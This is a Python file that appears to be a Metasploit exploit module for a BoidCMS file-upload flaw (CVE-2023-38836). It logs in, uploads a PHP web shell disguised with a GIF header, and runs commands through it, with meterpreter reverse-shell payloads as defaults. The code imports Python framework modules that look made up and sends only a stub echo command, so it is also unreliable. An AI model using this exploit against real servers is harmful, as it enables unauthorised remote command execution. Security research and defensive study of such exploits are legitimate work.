#!/usr/bin/env python3
# -*- coding: utf-8 -*-
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

"""
BoidCMS Command Injection (CVE-2023-38836)

This module exploits an improper sanitization bug in BoidCMS version 2.0.0
and below that allows authenticated upload of a PHP file as media if the file 
has the GIF header.
"""

import sys
import os

# Add parent directories to path for imports
sys.path.insert(0, os.path.join(os.path.dirname(__file__), '../../../../lib'))

from msf.core.exploit import Exploit, CheckCode, Failure
from msf.core.exploit.file_dropper import FileDropper
from msf.core.options import OptString
from rex.text import Text

try:
    import requests
    from lxml import etree
    HAS_DEPENDENCIES = True
except ImportError:
    HAS_DEPENDENCIES = False


class MetasploitModule(Exploit, FileDropper):
    """
    BoidCMS Command Injection exploit module
    """
    
    # Module ranking
    rank = Exploit.ExcellentRanking
    
    def __init__(self):
        """Initialize the exploit module"""
        super().__init__({
            'Name': 'BoidCMS Command Injection',
            'Description': '''
                This module leverages CVE-2023-38836, an improper sanitization bug in BoidCMS version 2.0.0
                and below. BoidCMS allows the authenticated upload of a php file as media if the file has
                the GIF header, even if the file is a php file.
            ''',
            'License': 'MSF_LICENSE',
            'Author': [
                '1337kid',    # Discovery
                'bwatters-r7', # Metasploit Module
                'GitHub Copilot' # Python conversion
            ],
            'References': [
                {'type': 'CVE', 'ref': '2023-38836'},
                {'type': 'URL', 'ref': 'https://github.com/1337kid/CVE-2023-38836'}
            ],
            'Privileged': False,
            'Arch': [self.ARCH_CMD],
            'Targets': [
                {
                    'name': 'nix Command',
                    'Platform': ['linux', 'unix', 'python'],
                    'DefaultOptions': {
                        'PAYLOAD': 'cmd/linux/http/x64/meterpreter_reverse_tcp',
                        'FETCH_COMMAND': 'WGET',
                        'FETCH_WRITABLE_DIR': '/tmp'
                    }
                },
                {
                    'name': 'Windows Command',
                    'Platform': ['windows', 'python'],
                    'DefaultOptions': {
                        'PAYLOAD': 'cmd/windows/http/x64/meterpreter_reverse_tcp',
                        'FETCH_WRITABLE_DIR': '%TEMP%',
                        'FETCH_COMMAND': 'CURL'
                    }
                }
            ],
            'DefaultTarget': 0,
            'DisclosureDate': '2023-07-13',
            'Notes': {
                'Stability': [self.CRASH_SAFE],
                'Reliability': [self.REPEATABLE_SESSION],
                'SideEffects': [self.IOC_IN_LOGS, self.ARTIFACTS_ON_DISK]
            }
        })
        
        FileDropper.__init__(self)
        
        # Register options
        self.register_options([
            OptString('TARGETURI', True, '', 'The path'),
            OptString('CMS_USERNAME', True, 'admin', 'Username'),
            OptString('CMS_PASSWORD', True, 'password', 'Password'),
            OptString('PHP_FILENAME', True, f"{Text.rand_text_alphanumeric(5, 11)}.php", 
                     'The name for the php file to upload')
        ])
        
        # Initialize state
        self.token = None
        self.shell_filename = None
        self.session_cookies = requests.Session()
        
    def check(self):
        """
        Check if target is vulnerable
        
        Returns:
            CheckCode indicating vulnerability status
        """
        if not HAS_DEPENDENCIES:
            return CheckCode.Unknown('Required dependencies (requests, lxml) not available')
            
        try:
            uri = self.normalize_uri(self.datastore.get('TARGETURI', ''), 'admin')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            res = self.session_cookies.get(url, timeout=10)
            
            if res and res.status_code == 200:
                # Parse HTML to check for BoidCMS
                try:
                    tree = etree.HTML(res.content)
                    title = tree.xpath('//title/text()')
                    if title and 'BoidCMS' in title[0]:
                        return CheckCode.Detected('Detected BoidCMS, but the version is unknown.')
                except Exception as e:
                    self.vprint_error(f"Error parsing HTML: {e}")
                    
            return CheckCode.Safe('Unable to retrieve BoidCMS title page')
            
        except Exception as e:
            self.print_error(f"Check failed: {e}")
            return CheckCode.Unknown(f'Error during check: {e}')
            
    def extract_token(self, response):
        """
        Extract CSRF token from response
        
        Args:
            response: HTTP response object
            
        Returns:
            Token string or None
        """
        try:
            if response and response.status_code == 200:
                tree = etree.HTML(response.content)
                token_elem = tree.xpath("//input[@name='token']/@value")
                if token_elem:
                    return token_elem[0]
        except Exception as e:
            self.vprint_error(f"Error extracting token: {e}")
        return None
        
    def cms_token(self):
        """
        Get CSRF token from CMS
        
        Returns:
            Token string or None
        """
        if self.token is not None:
            return self.token
            
        self.vprint_status('Getting Token')
        try:
            uri = self.normalize_uri(self.datastore.get('TARGETURI', ''), 'admin')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            res = self.session_cookies.get(url, timeout=10)
            self.token = self.extract_token(res)
            return self.token
        except Exception as e:
            self.print_error(f"Error getting token: {e}")
            return None
            
    def cms_login(self, login_token):
        """
        Authenticate to CMS
        
        Args:
            login_token: CSRF token for login
            
        Returns:
            True if login successful, False otherwise
        """
        self.vprint_status('Logging into CMS')
        
        try:
            cms_password = self.datastore['CMS_PASSWORD']
            cms_username = self.datastore['CMS_USERNAME']
            
            form_data = {
                'username': cms_username,
                'password': cms_password,
                'login': 'Login',
                'token': str(login_token)
            }
            
            uri = self.normalize_uri(self.datastore.get('TARGETURI', ''), 'admin')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            res = self.session_cookies.post(url, data=form_data, timeout=10, allow_redirects=False)
            return res and res.status_code == 302
            
        except Exception as e:
            self.print_error(f"Error during login: {e}")
            return False
            
    def upload_php(self, login_token, shell_filename):
        """
        Upload malicious PHP file disguised as GIF
        
        Args:
            login_token: CSRF token
            shell_filename: Name for uploaded file
            
        Returns:
            True if upload successful, False otherwise
        """
        self.vprint_status(f"Uploading PHP file {shell_filename}")
        
        try:
            # Create PHP webshell with GIF header
            php_content = 'GIF89a;\n<?php system($_GET["cmd"]) ?>'
            
            files = {
                'file': (shell_filename, php_content, 'application/octet-stream')
            }
            
            data = {
                'token': str(login_token),
                'upload': 'Upload'
            }
            
            uri = self.normalize_uri(self.datastore.get('TARGETURI', ''), 'admin')
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            res = self.session_cookies.post(
                url,
                files=files,
                data=data,
                params={'page': 'media'},
                timeout=10,
                allow_redirects=False
            )
            
            return res and res.status_code == 302
            
        except Exception as e:
            self.print_error(f"Error uploading PHP: {e}")
            return False
            
    def launch_payload(self, shell_filename, payload_cmd):
        """
        Execute payload through uploaded PHP webshell
        
        Args:
            shell_filename: Name of uploaded PHP file
            payload_cmd: Command to execute
        """
        self.vprint_status('Launching Payload')
        
        try:
            uri = self.normalize_uri(self.datastore.get('TARGETURI', ''), 'media', shell_filename)
            url = f"http://{self.datastore['RHOST']}:{self.datastore['RPORT']}{uri}"
            
            self.session_cookies.get(
                url,
                params={'cmd': payload_cmd},
                timeout=10
            )
        except Exception as e:
            # Connection might close when payload executes
            self.vprint_status(f"Payload launched (connection may have closed): {e}")
            
    def exploit(self):
        """
        Main exploit routine
        """
        if not HAS_DEPENDENCIES:
            self.fail_with(Failure.BadConfig, 'Required dependencies (requests, lxml) not installed')
            
        self.shell_filename = self.datastore['PHP_FILENAME']
        login_token = self.cms_token()
        
        if login_token is None:
            self.fail_with(Failure.UnexpectedReply, 'Failed to retrieve token for login')
            
        if not self.cms_login(login_token):
            self.fail_with(Failure.UnexpectedReply, 'Failed to log in')
            
        if self.upload_php(login_token, self.shell_filename):
            self.register_file_for_cleanup(self.shell_filename)
            # In real implementation, payload.encoded would contain the actual payload
            payload_cmd = "echo 'Exploit successful'"
            self.launch_payload(self.shell_filename, payload_cmd)
            self.print_good("Exploit completed successfully")
        else:
            self.fail_with(Failure.UnexpectedReply, 'Failed to upload PHP file')


if __name__ == '__main__':
    # Standalone execution for testing
    module = MetasploitModule()
    print(f"Module: {module.info['Name']}")
    print(f"Description: {module.info['Description']}")
    print(f"Author: {', '.join(module.info['Author'])}")
    print(f"\nThis is a Metasploit module and should be run through msfconsole")
